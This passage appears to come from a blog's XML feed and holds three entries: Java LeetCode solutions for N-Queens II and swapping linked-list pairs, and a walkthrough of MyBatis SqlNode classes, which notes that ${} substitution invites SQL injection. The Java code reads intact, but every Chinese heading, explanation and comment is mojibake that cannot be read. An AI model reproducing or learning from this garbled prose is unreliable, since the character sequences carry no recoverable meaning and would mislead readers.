        <content type="html"><![CDATA[<h3 id="ÊÄùËÄÉ"><a href="#ÊÄùËÄÉ" class="headerlink" title="ÊÄùËÄÉ"></a>ÊÄùËÄÉ</h3><p>1.ÂØπ‰∫éÂõûÊ∫ØÁÆóÊ≥ïÔºåÂíå‰πãÂâçÁöÑÁîüÊàêÊã¨Âè∑ÊòØ‰∏ÄÊ†∑ÁöÑÔºå‰∏çË¶ÅÊÉ≥ÁùÄËá™Â∑±Áî®forÂæ™ÁéØÂéªËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºåËÄåÊòØÈúÄË¶ÅÁî®ÈÄíÂΩíËß£ÂÜ≥„ÄÇ<br>2.Ë¶ÅÊ≥®ÊÑèÂà∞ÁöÑÊòØÔºåÂú®ÈÄíÂΩíÊó∂Ôºå‰∏çË¶ÅÁî®javaÁöÑlistËøôÁßç‰º†ÈÄíÔºåÊúÄÂ•ΩÁî®int[][]Á±ªÂûãÂ±ûÊÄßÊù•‰º†ÈÄí„ÄÇ<br>3.Ëøô‰∏ÄÈ¢òÊúâ‰∏™ÈôêÂà∂Êù°‰ª∂Ôºå‚ë†ÁöáÂêéÊï∞ÁõÆÔºàÂΩìÊúÄÂêé‰∏Ä‰∏™Ê£ãÂ≠êÂ∑≤Áªè‰∏ãÂÆåÔºâ‚ë°Ê®™Á´ñÔºåÊñúÁ∫øÔºåËøô‰∏™ÊñúÁ∫øÊúâÁÇπÊÅ∂ÂøÉÁöÑÂú∞ÊñπÊòØÊòØ45¬∞Âíå135¬∞ÈÉΩË¶ÅËÄÉËôë„ÄÇ</p><pre><code>//n ÁöáÂêéÈóÆÈ¢òÁ†îÁ©∂ÁöÑÊòØÂ¶Ç‰ΩïÂ∞Ü n ‰∏™ÁöáÂêéÊîæÁΩÆÂú® n√ón ÁöÑÊ£ãÁõò‰∏äÔºåÂπ∂‰∏î‰ΩøÁöáÂêéÂΩºÊ≠§‰πãÈó¥‰∏çËÉΩÁõ∏‰∫íÊîªÂáª„ÄÇ //// //// ‰∏äÂõæ‰∏∫ 8 ÁöáÂêéÈóÆÈ¢òÁöÑ‰∏ÄÁßçËß£Ê≥ï„ÄÇ //// ÁªôÂÆö‰∏Ä‰∏™Êï¥Êï∞ nÔºåËøîÂõû n ÁöáÂêé‰∏çÂêåÁöÑËß£ÂÜ≥ÊñπÊ°àÁöÑÊï∞Èáè„ÄÇ //// Á§∫‰æã: //// ËæìÂÖ•: 4//ËæìÂá∫: 2//Ëß£Èáä: 4 ÁöáÂêéÈóÆÈ¢òÂ≠òÂú®Â¶Ç‰∏ã‰∏§‰∏™‰∏çÂêåÁöÑËß£Ê≥ï„ÄÇ//[// [&quot;.Q..&quot;,  // Ëß£Ê≥ï 1//  &quot;...Q&quot;,//  &quot;Q...&quot;,//  &quot;..Q.&quot;],//// [&quot;..Q.&quot;,  // Ëß£Ê≥ï 2//  &quot;Q...&quot;,//  &quot;...Q&quot;,//  &quot;.Q..&quot;]//]// //// //// ÊèêÁ§∫Ôºö //// // ÁöáÂêéÔºåÊòØÂõΩÈôÖË±°Ê£ã‰∏≠ÁöÑÊ£ãÂ≠êÔºåÊÑèÂë≥ÁùÄÂõΩÁéãÁöÑÂ¶ªÂ≠ê„ÄÇÁöáÂêéÂè™ÂÅö‰∏Ä‰ª∂‰∫ãÔºåÈÇ£Â∞±ÊòØ‚ÄúÂêÉÂ≠ê‚Äù„ÄÇÂΩìÂ•πÈÅáËßÅÂèØ‰ª•ÂêÉÁöÑÊ£ãÂ≠êÊó∂ÔºåÂ∞±ËøÖÈÄüÂÜ≤‰∏äÂéªÂêÉÊéâÊ£ãÂ≠ê„ÄÇÂΩìÁÑ∂ÔºåÂ•πÊ®™„ÄÅÁ´ñ„ÄÅÊñúÈÉΩÂèØËµ∞‰∏ÄÊàñ N//-1 Ê≠•ÔºåÂèØËøõÂèØÈÄÄ„ÄÇÔºàÂºïÁî®Ëá™ ÁôæÂ∫¶ÁôæÁßë - ÁöáÂêé Ôºâ // // Related Topics ÂõûÊ∫ØÁÆóÊ≥ï // üëç 181 üëé 0//leetcode submit region begin(Prohibit modification and deletion)class Solution {    int total = 0;    public int totalNQueens(int n) {        char[][] array = new char[n][n];        build(0, 0, n, array, &apos;.&apos;, 0);        build(0, 0, n, array, &apos;Q&apos;, 1);        return total;    }    public void build(int x, int y, int n, char[][] oneResult, char currentCh, int queueCount) {        if (x &gt;= n || y &gt;= n) {            return;        }        if (currentCh == &apos;Q&apos;) {//            // Âè≥‰∏ãÊñπÊñúÁ∫ø            int tempY = y - 1;            int tempX = x - 1;            while (tempX &gt;= 0 &amp;&amp; tempY &gt;= 0) {                if (oneResult[tempX][tempY] == currentCh) {                    return;                }                tempY--;                tempX--;            }            // Â∑¶‰∏äÊñπÊñúÁ∫ø            tempX = x - 1;            tempY = y + 1;            while (tempX &lt;= n - 1 &amp;&amp; tempY &gt;= 0 &amp;&amp; tempX &gt;= 0 &amp;&amp; tempY &lt;= n - 1) {                if (oneResult[tempX][tempY] == currentCh) {                    return;                }                tempX--;                tempY++;            }            // Ê®™Á∫ø            for (int p = 0; p &lt; y; p++) {                if (oneResult[x][p] == currentCh) {                    return;                }            }            // Á´ñÁ∫ø            for (int p = 0; p &lt; x; p++) {                if (oneResult[p][y] == currentCh) {                    return;                }            }        }        oneResult[x][y] = currentCh;        if (x == n - 1 &amp;&amp; y == n - 1) {            if (queueCount == n) {                total+=1;            }            return;        }        if (y == n - 1) {            build(x + 1, 0, n, oneResult, &apos;Q&apos;, queueCount + 1);            build(x + 1, 0, n, oneResult, &apos;.&apos;, queueCount);        } else {            build(x, y + 1, n, oneResult, &apos;Q&apos;, queueCount + 1);            build(x, y + 1, n, oneResult, &apos;.&apos;, queueCount);        }    }}//leetcode submit region end(Prohibit modification and deletion)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mybatis‰∏≠sqlNode</title>
      <link href="/2020/10/17/mybatis%E4%B8%ADsqlNode/"/>
      <url>/2020/10/17/mybatis%E4%B8%ADsqlNode/</url>
      
        <content type="html"><![CDATA[<h3 id="mybatis‰∏≠sqlNode"><a href="#mybatis‰∏≠sqlNode" class="headerlink" title="mybatis‰∏≠sqlNode"></a>mybatis‰∏≠sqlNode</h3><h4 id="TextSqlNode"><a href="#TextSqlNode" class="headerlink" title="TextSqlNode"></a>TextSqlNode</h4><pre><code>HashMap&lt;String,String&gt; parameterObject = new HashMap&lt;&gt;();parameterObject.put(&quot;id&quot;,&quot;123&quot;);parameterObject.put(&quot;name&quot;,&quot;huskyui&quot;);TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where id = #{id} and name = ${name}&quot;);SqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode));DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode);BoundSql boundSql = dynamicSqlSource.getBoundSql(parameterObject);System.out.println(boundSql.getSql());// ËøôÂè•ËØùÊúÄÂêéËæìÂá∫ÁöÑÁªìÊûúÊòØ// select * from blog where id = ? and name = huskyui// ‰ΩøÁî®dynamicSqlSource.getBoundSqlÊó∂Ôºå‰ºöË∞ÉÁî®mixedSqlNodeÁöÑapplyÊñπÊ≥ï„ÄÇËÄåmixedSqlNode‰ºöforeachË∞ÉÁî®ÊûÑÈÄ†ÂèÇÊï∞ÈáåÈù¢ÁöÑArrays.asList// (textSqlNode)ÁöÑapplyÊñπÊ≥ï,‰ºöËß¶ÂèëÂØπ${}ËøõË°åËß£ÊûêÔºåÂπ∂ÊõøÊç¢</code></pre><p>‰∏ãÈù¢Êàë‰ª¨Êù•Ê®°Êãü‰∏Ä‰∏™Ëß£ÊûêÁöÑ</p><pre><code>// TextSqlNodeÈáåÈù¢ÁöÑÂØπ${}ËøõË°åËß£ÊûêÔºå‰∏ãÈù¢Â∞±ÊòØ‰∏Ä‰∏™Â§ßÊ¶ÇÂÆû‰æãÔºåÂÆûÈôÖ‰∏≠‰ΩøÁî®Âà∞‰∫ÜOgnlCacheGenericTokenParser tokenParser = new GenericTokenParser(&quot;${&quot;, &quot;}&quot;, new TokenHandler() {    @Override    // Ëøô‰∏™ÊñπÊ≥ï‰∏ªË¶ÅÈíàÂØπ${context},ÂØπcontextËøõË°åÂ§ÑÁêÜ    public String handleToken(String content) {        HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;();        map.put(&quot;name&quot;,&quot;huskyui&quot;);        return map.get(content);    }});String parsedText = tokenParser.parse(&quot;select * from blog where name = ${name}&quot;);System.out.println(parsedText);</code></pre><p>#{ÂèÇÊï∞Âêç}ÊúÄÁªàËß£ÊûêÂá∫Êù•ÁöÑ <code>Ôºü</code> ÊòØÁî®‰∫éjavaÂéüÁîüËá™Â∏¶ÁöÑ <code>PreparedStatement</code> ËøôÁßçÊñπÂºèÊù•ËøõË°å,Èò≤Ê≠¢ <em>sqlÊ≥®ÂÖ•</em></p><p>ÂΩìÁÑ∂ÔºåÊàë‰ª¨‰πüÈúÄË¶ÅÊ≥®ÊÑèÂà∞ÁöÑ‰∏ÄÁÇπÊòØ${}ÊòØ‰ºöÁõ¥Êé•ËøõË°åÊõøÊç¢ÁöÑÔºåËøôÈáåÂ∞±‰ºöÂá∫Áé∞‰∏äÈù¢ÂèØËÉΩÂá∫Áé∞ÁöÑ <em>sqlÊ≥®ÂÖ•</em> ÈóÆÈ¢ò</p><p>ÂèÇËÄÉÔºö <a href="https://www.cnblogs.com/question-sky/p/7569405.html" target="_blank" rel="noopener">https://www.cnblogs.com/question-sky/p/7569405.html</a></p><h4 id="IfSqlNode"><a href="#IfSqlNode" class="headerlink" title="IfSqlNode"></a>IfSqlNode</h4><p>Âú®xml‰∏≠Âá∫Áé∞ÁöÑÊñπÂºèÊúâÂ§öÁßçÔºåÊàë‰ª¨‰∏æ‰∏™ÊúÄÁÆÄÂçïÁöÑ‰æãÂ≠ê</p><pre><code>select * from userWHERE 1 = 1&lt;if test=&quot;phone != null and phone != &apos;&apos;&quot;&gt;AND phone = #{phone}&lt;/if&gt;</code></pre><p>ÊúÄÁªàËß£Êûê‰∏∫</p><pre><code>HashMap&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;();propertyMap.put(&quot;phone&quot;,&quot;110&quot;);TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from user\n&quot; +&quot; WHERE 1 = 1&quot;);IfSqlNode ifSqlNode = new IfSqlNode(new TextSqlNode(&quot;AND phone = #{phone}&quot;),&quot;phone != null and phone != &apos;&apos;&quot;);SqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode,ifSqlNode));DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode);System.out.println(dynamicSqlSource.getBoundSql(propertyMap).getSql());</code></pre><p>Ëß£Èáä</p><p>Âú®Ë∞ÉÁî®IfSqlNodeÁöÑapplyÊñπÊ≥ïÊó∂Ôºå‰ºöË∞ÉÁî®Ëá™Ë∫´Â∞ÅË£ÖÁöÑOgnlÂ§ÑÁêÜ <code>&quot;phone != null and phone != &#39;&#39;&quot;</code><br>ËøôÊÆµËØ≠Âè•ÔºåÂ¶ÇÊûú‰∏∫trueÔºåÂàôË∞ÉÁî®TextSqlNodeÈáåÈù¢ÁöÑapplyÊñπÊ≥ïÔºåËß£Êûê${}Âπ∂Â∞ÜËß£ÊûêÂÆåÁöÑËØ≠Âè•appendÂà∞ÁªìÊûú‰∏äÈù¢Âéª„ÄÇ</p><p>ÊàëÂΩìÊó∂‰∏ÄÁõ¥Âú®ÊÉ≥ÔºåËøô‰∏™testÈáåÈù¢ÁöÑÂÄºÔºåÂà∞Â∫ïÊòØÂ¶Ç‰ΩïÂ§ÑÁêÜÁöÑÔºåÈöæÈÅìÊòØmybatisËá™Â∑±ÂÜôÁöÑËß£ÊûêÔºåÊúÄÁªàÂèëÁé∞‰∫ÜËøô‰∏™È°πÁõÆÂºïËøõ‰∫Ü <code>ognl</code> .</p><p>‰∏çÈáçÂ§çÈÄ†ËΩÆÂ≠êÔºåÁ´ôÂú®Â∑®‰∫∫ÁöÑËÇ©ËÜÄ‰∏ä„ÄÇ</p><p>ÈÇ£‰πàÔºåÊàë‰ª¨Â∞±Êù•Ê®°ÊãüÂá∫‰∏Ä‰∏™ognlÊòØÂ¶Ç‰ΩïÂÆûÁé∞ÂØπËøô‰∏™Ëß£ÊûêÁöÑ</p><pre><code>OgnlContext context = new OgnlContext(null,null,new DefaultMemberAccess(true));Map&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;();propertyMap.put(&quot;phone&quot;,&quot;110&quot;);System.out.println(Ognl.getValue(&quot;phone!=null and phone != &apos;&apos;&quot;, context, propertyMap));</code></pre><h4 id="ChooseSqlNode"><a href="#ChooseSqlNode" class="headerlink" title="ChooseSqlNode"></a>ChooseSqlNode</h4><pre><code>SELECT * FROM BLOG WHERE state = ‚ÄòACTIVE‚Äô&lt;choose&gt;  &lt;when test=&quot;title != null&quot;&gt;    AND title like #{title}  &lt;/when&gt;  &lt;when test=&quot;author != null and author.name != null&quot;&gt;    AND author_name like #{author.name}  &lt;/when&gt;  &lt;otherwise&gt;    AND featured = 1  &lt;/otherwise&gt;&lt;/choose&gt;</code></pre><p>Â§ßÊ¶ÇËß£Êûê‰∏∫ÔºåÂπ∂‰∏çÁõ∏Á¨¶ÔºåÊàëÂè™ÊòØ‰∏æ‰∏™‰æãÂ≠êÔºåÁî±‰∫éÂú®Â∑•‰Ωú‰∏≠ÂæàÂ∞ëÁî®Âà∞Ëøô‰∏™choose</p><pre><code>HashMap&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;();//        propertyMap.put(&quot;id&quot;,1);//        propertyMap.put(&quot;name&quot;,&quot;huskyui&quot;);TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where 1 = 1&quot;);List&lt;SqlNode&gt; ifNodeList = new ArrayList&lt;&gt;();ifNodeList.add(new IfSqlNode(new TextSqlNode(&quot;and name = #{name}&quot;),&quot;name != null and name != &apos;&apos;&quot;));ifNodeList.add(new IfSqlNode(new TextSqlNode(&quot;and id = #{id}&quot;),&quot;id != null and id != &apos;&apos;&quot;));TextSqlNode defaultSqlNode = new TextSqlNode(&quot;and id &gt; 0&quot;);ChooseSqlNode chooseSqlNode = new ChooseSqlNode(ifNodeList,defaultSqlNode);MixedSqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode,chooseSqlNode));DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode);System.out.println(dynamicSqlSource.getBoundSql(propertyMap).getSql());</code></pre><p>chooseSqlNodeÊúâÁÇπÂÉèjava‰∏≠ÁöÑswitch-<br>case,‰ΩÜ‰∏çÊòØÂÖ®ÂÉè(chooseSqlNode‰∏çËÉΩÂ§ö‰∏™Êù°‰ª∂ÊâßË°åÂêå‰∏Ä‰∏™)„ÄÇÊàë‰ª¨Êù•Áúã‰∏Ä‰∏ãChooseSqlNodeÈáåÈù¢ÁöÑapplyÊñπÊ≥ï</p><pre><code>@Overridepublic boolean apply(DynamicContext context) {  for (SqlNode sqlNode : ifSqlNodes) {    if (sqlNode.apply(context)) {      return true;    }  }  if (defaultSqlNode != null) {    defaultSqlNode.apply(context);    return true;  }  return false;}</code></pre><p>‰ª£Á†ÅÂÜôÁöÑÂæàÊ∏ÖÊ•öÔºå‰∏ÄÁúãÂ∞±ÊáÇ</p><h4 id="TrimSqlNode"><a href="#TrimSqlNode" class="headerlink" title="TrimSqlNode"></a>TrimSqlNode</h4><p>Êàë‰ª¨ÂÖàËÆ≤Ëß£TrimSqlNode,ÁÑ∂ÂêéÂÜçËÆ≤Ëß£WhereSqlNodeÂíåSetSqlNode</p><pre><code>&lt;select id=&quot;selectSome&quot;&gt;select * from blog&lt;trim prefix=&quot;where&quot; prefixOverrides=&quot;and|or&quot;&gt;&lt;if test=&quot;name!=null&quot;&gt;and `name` = #{name}&lt;/if&gt;&lt;if test=&quot;age!=null&quot;&gt;and age =#{age}&lt;/if&gt;&lt;/trim&gt;&lt;/select&gt;TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog&quot;);IfSqlNode ifSqlNode1 = new IfSqlNode(new TextSqlNode(&quot;and name = #{name} &quot;),&quot;true&quot;);IfSqlNode ifSqlNode2 = new IfSqlNode(new TextSqlNode(&quot;and age = #{age}&quot;),&quot;true&quot;);MixedSqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(ifSqlNode1,ifSqlNode2));TrimSqlNode trimSqlNode = new TrimSqlNode(new Configuration(),mixedSqlNode,&quot;where&quot;,&quot;and|or&quot;,null,null);DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),new MixedSqlNode(Arrays.asList(textSqlNode,trimSqlNode)));System.out.println(dynamicSqlSource.getBoundSql(null).getSql());</code></pre><p>Êàë‰ª¨Êù•ÁúãÁúã <code>TrimSqlNode</code> ÁöÑÊûÑÈÄ†ÂèÇÊï∞</p><pre><code>public TrimSqlNode(Configuration configuration, SqlNode contents, String prefix, String prefixesToOverride, String suffix, String suffixesToOverride) {    this(configuration, contents, prefix, parseOverrides(prefixesToOverride), suffix, parseOverrides(suffixesToOverride));}</code></pre><p>Ê≠§Â§Ñ‰ºöÂ∞Ü <code>prefixesToOveride</code> Â≠óÁ¨¶‰∏≤ËøõË°åÊ†πÊçÆ <code>|</code> ÂàÜÂâ≤</p><p>Êü•Áúã <code>apply</code> ÊñπÊ≥ï</p><pre><code>@Overridepublic boolean apply(DynamicContext context) {    FilteredDynamicContext filteredDynamicContext = new FilteredDynamicContext(context);    // Ê≠§Âè•ÊâßË°åÔºåMixedSqlNode‰∏≠applyÊñπÊ≥ïÔºåËÄåapplyÊñπÊ≥ïÂ∞±ÊòØforEach‰æùÊ¨°ÊâßË°åÂ≠êÁöÑapplyÊñπÊ≥ï    // and name = #{name} and age = #{age}    // ÁîüÊàêËøôÊ†∑ÁöÑ    boolean result = contents.apply(filteredDynamicContext);    // ËøôÂè•ËØù‰ºöÂØπ‰∏äÈù¢ËøôÂè•ËØùËøõË°åËß£ÊûêÔºå‰∏æ‰æã‰∏äÈù¢ÁöÑÔºåÂéªÈô§ËØ≠Âè•ÂâçÈù¢ÁöÑand|or,ÁÑ∂ÂêéÂä†‰∏äwhere,ÂΩìÁÑ∂Âè™ÊòØÂä†‰∏ä‰∫ÜÂâçÁºÄËß£Êûê    filteredDynamicContext.applyAll();    return result;}</code></pre><h4 id="WhereSqlNode"><a href="#WhereSqlNode" class="headerlink" title="WhereSqlNode"></a>WhereSqlNode</h4><p><code>WhereSqlNode</code> Êú¨Ë¥®‰∏äÊòØÂü∫Á°Ä‰∫ÜTrimSqlNode„ÄÇÊàë‰ª¨Â∞±Êù•ÂìÅÂìÅ‰ªñÁöÑÊûÑÈÄ†ÂèÇÊï∞</p><pre><code>private static List&lt;String&gt; prefixList = Arrays.asList(&quot;AND &quot;,&quot;OR &quot;,&quot;AND\n&quot;, &quot;OR\n&quot;, &quot;AND\r&quot;, &quot;OR\r&quot;, &quot;AND\t&quot;, &quot;OR\t&quot;);public WhereSqlNode(Configuration configuration, SqlNode contents) {    super(configuration, contents, &quot;WHERE&quot;, prefixList, null, null);}&lt;select id=&quot;findActiveBlogLike&quot;     resultType=&quot;Blog&quot;&gt;  SELECT * FROM BLOG  &lt;where&gt;    &lt;if test=&quot;state != null&quot;&gt;         state = #{state}    &lt;/if&gt;    &lt;if test=&quot;title != null&quot;&gt;        AND title like #{title}    &lt;/if&gt;    &lt;if test=&quot;author != null and author.name != null&quot;&gt;        AND author_name like #{author.name}    &lt;/if&gt;  &lt;/where&gt;&lt;/select&gt;</code></pre><h4 id="SetSqlNode"><a href="#SetSqlNode" class="headerlink" title="SetSqlNode"></a>SetSqlNode</h4><pre><code>&lt;update id=&quot;updateAuthorIfNecessary&quot;&gt;  update Author    &lt;set&gt;      &lt;if test=&quot;username != null&quot;&gt;username=#{username},&lt;/if&gt;      &lt;if test=&quot;password != null&quot;&gt;password=#{password},&lt;/if&gt;      &lt;if test=&quot;email != null&quot;&gt;email=#{email},&lt;/if&gt;      &lt;if test=&quot;bio != null&quot;&gt;bio=#{bio}&lt;/if&gt;    &lt;/set&gt;  where id=#{id}&lt;/update&gt;</code></pre><p><code>SetSqlNode</code> ÊûÑÈÄ†ÂèÇÊï∞</p><pre><code>private static final List&lt;String&gt; COMMA = Collections.singletonList(&quot;,&quot;);public SetSqlNode(Configuration configuration,SqlNode contents) {  super(configuration, contents, &quot;SET&quot;, COMMA, null, COMMA);}</code></pre><p>Ëß£ÈáäÔºöÂéªÈô§ÊãºÊé•Â•ΩÂêéÁöÑËØ≠Âè• <code>username= ? ,password= ? ,email= ? ,bio= ?</code> ÂéªÈô§ÂâçÂêéÁöÑ <code>,</code> ÔºåÂπ∂Âú®ÂâçÂä†‰∏ä<br><code>set</code> ÔºåÂêé‰∏çÂä†</p><h4 id="ForeachSqlNode"><a href="#ForeachSqlNode" class="headerlink" title="ForeachSqlNode"></a>ForeachSqlNode</h4><pre><code>&lt;select id=&quot;selectPostIn&quot; resultType=&quot;domain.blog.Post&quot;&gt;  SELECT *  FROM POST P  WHERE ID in  &lt;foreach item=&quot;item&quot; index=&quot;index&quot; collection=&quot;list&quot;      open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt;        #{item}  &lt;/foreach&gt;&lt;/select&gt;</code></pre><p>‰∏äÈù¢ËøôÂè•ËØùÂ¶ÇÊûúÊ≠£Â∏∏ÁöÑËØùÔºå‰ºöËß£ÊûêÊàê</p><p><code>select * from blog where id in ( ? , ? , ? , ? , ? , ? )</code></p><pre><code>Map&lt;String,Object&gt; properties = new HashMap&lt;&gt;();properties.put(&quot;list&quot;,Arrays.asList(1,2,3,4,5,6));TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where id in &quot;);ForEachSqlNode forEachSqlNode = new ForEachSqlNode(new Configuration(),new TextSqlNode(&quot;#{item}&quot;),&quot;list&quot;,&quot;index&quot;,&quot;item&quot;,&quot;(&quot;,&quot;)&quot;,&quot;,&quot;);DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),new MixedSqlNode(Arrays.asList(textSqlNode,forEachSqlNode)));System.out.println(dynamicSqlSource.getBoundSql(properties).getSql());</code></pre><p>Êàë‰ª¨Â∞±Êù•ÁúãÁúãËøô‰∏™ForEachNodeÁöÑapplyÊñπÊ≥ïÊòØÂ¶Ç‰ΩïÂÆûÁé∞ÁöÑ</p><pre><code>@Override  public boolean apply(DynamicContext context) {    Map&lt;String, Object&gt; bindings = context.getBindings();    // ÈÄöËøáOgnl.getValueÊù•Âà§Êñ≠ÂΩìÂâçÊòØÂê¶ÊòØÂèØ‰ª•Ëø≠‰ª£ÁöÑ    final Iterable&lt;?&gt; iterable = evaluator.evaluateIterable(collectionExpression, bindings);     // Â¶ÇÊûúÊòØ‰∏çÂèØ‰ª•Ëø≠‰ª£ÁöÑÔºåÈÇ£‰πàÂ∞±Ê≠§ÁªìÊùü    if (!iterable.iterator().hasNext()) {      return true;    }      // Ê†áÂøó‰Ωç    boolean first = true;      // Âú®sqlËØ≠Âè•‰∏≠ÂÖàÂä†ÂÖ•open    applyOpen(context);    int i = 0;    for (Object o : iterable) {      DynamicContext oldContext = context;      if (first || separator == null) {        context = new PrefixedContext(context, &quot;&quot;);      } else {        context = new PrefixedContext(context, separator);      }        // ‰∏∫‰∫ÜindexËÄåÂáÜÂ§áÁöÑ„ÄÇÂ∞±ÊòØ‰∏Ä‰∏™Á¥ØÂä†Âô®„ÄÇ‰ªé0ÂºÄÂßã      int uniqueNumber = context.getUniqueNumber();      // Issue #709        // Â¶ÇÊûúÊòØmapÁ±ªÂûãÁöÑ      if (o instanceof Map.Entry) {        @SuppressWarnings(&quot;unchecked&quot;)        Map.Entry&lt;Object, Object&gt; mapEntry = (Map.Entry&lt;Object, Object&gt;) o;          //keyÂÅö‰∏∫index„ÄÇ        applyIndex(context, mapEntry.getKey(), uniqueNumber);        applyItem(context, mapEntry.getValue(), uniqueNumber);      } else {          // Âê¶ÂàôÂ∞±ÊòØcollectionÔºåkeyÊòØ‰∏ãÊ†á        applyIndex(context, i, uniqueNumber);        applyItem(context, o, uniqueNumber);      }        // Ëøô‰∏™Âú∞ÊñπË∞ÉÁî®ÁöÑÊòØTextSqlNodeÁöÑapplyÊñπÊ≥ïÔºåapplyÊñπÊ≥ïÈáåÈù¢Ë∞ÉÁî®‰∫ÜFiltedDynamicContextÁöÑappendSqlÊñπÊ≥ï      contents.apply(new FilteredDynamicContext(configuration, context, index, item, uniqueNumber));      if (first) {        first = !((PrefixedContext) context).isPrefixApplied();      }      context = oldContext;      i++;    }      // Âú®Êú´Â∞æÂä†‰∏äclose    applyClose(context);    context.getBindings().remove(item);    context.getBindings().remove(index);    return true;  }</code></pre><p>ÊúÄÁªà‰ºöÁîüÊàê <code>select * from blog where id in ( #{__frch_item_0} , #{__frch_item_1} ,#{__frch_item_2} , #{__frch_item_3} , #{__frch_item_4} , #{__frch_item_5} )</code></p><p>Âú®Ë∞ÉÁî®DynamicSqlSourceË∞ÉÁî®getBoundSql‰ºöÂ∞Ü#{}ÊõøÊç¢ÊàêÔºü</p>]]></content>
      
      
      
        <tags>
            
            <tag> mybatis </tag>
            
            <tag> orm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode-24‰∏§‰∏§‰∫§Êç¢ÈìæË°®‰∏≠ÁöÑËäÇÁÇπ</title>
      <link href="/2020/10/13/leetcode-24%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/"/>
      <url>/2020/10/13/leetcode-24%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<pre><code>//ÁªôÂÆö‰∏Ä‰∏™ÈìæË°®Ôºå‰∏§‰∏§‰∫§Êç¢ÂÖ∂‰∏≠Áõ∏ÈÇªÁöÑËäÇÁÇπÔºåÂπ∂ËøîÂõû‰∫§Êç¢ÂêéÁöÑÈìæË°®„ÄÇ //// ‰Ω†‰∏çËÉΩÂè™ÊòØÂçïÁ∫ØÁöÑÊîπÂèòËäÇÁÇπÂÜÖÈÉ®ÁöÑÂÄºÔºåËÄåÊòØÈúÄË¶ÅÂÆûÈôÖÁöÑËøõË°åËäÇÁÇπ‰∫§Êç¢„ÄÇ //// //// Á§∫‰æã: //// ÁªôÂÆö 1-&gt;2-&gt;3-&gt;4, ‰Ω†Â∫îËØ•ËøîÂõû 2-&gt;1-&gt;4-&gt;3.// // Related Topics ÈìæË°® // üëç 676 üëé 0//leetcode submit region begin(Prohibit modification and deletion)/** * Definition for singly-linked list. * public class ListNode { *     int val; *     ListNode next; *     ListNode() {} *     ListNode(int val) { this.val = val; } *     ListNode(int val, ListNode next) { this.val = val; this.next = next; } * } */class Solution {    public ListNode swapPairs(ListNode head) {        ListNode root = new ListNode(-1);        root.next = head;        ListNode pre = root;        if(head == null||head.next==null){            return head;        }        ListNode p = head;        ListNode q = head.next;        while (p != null &amp;&amp; q != null) {            pre.next = q;            p.next = q.next;            q.next = p;            pre = pre.next.next;            if( pre == null||pre.next==null){                break;            }else{                p = pre.next;                q = pre.next.next;            }        }        return root.next;    }}//leetcode submit region end(Prohibit modification and deletion)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode142-ÁéØÂΩ¢ÈìæË°®</title>
      <link href="/2020/10/12/leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/"/>
      <url>/2020/10/12/leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/</url>
      
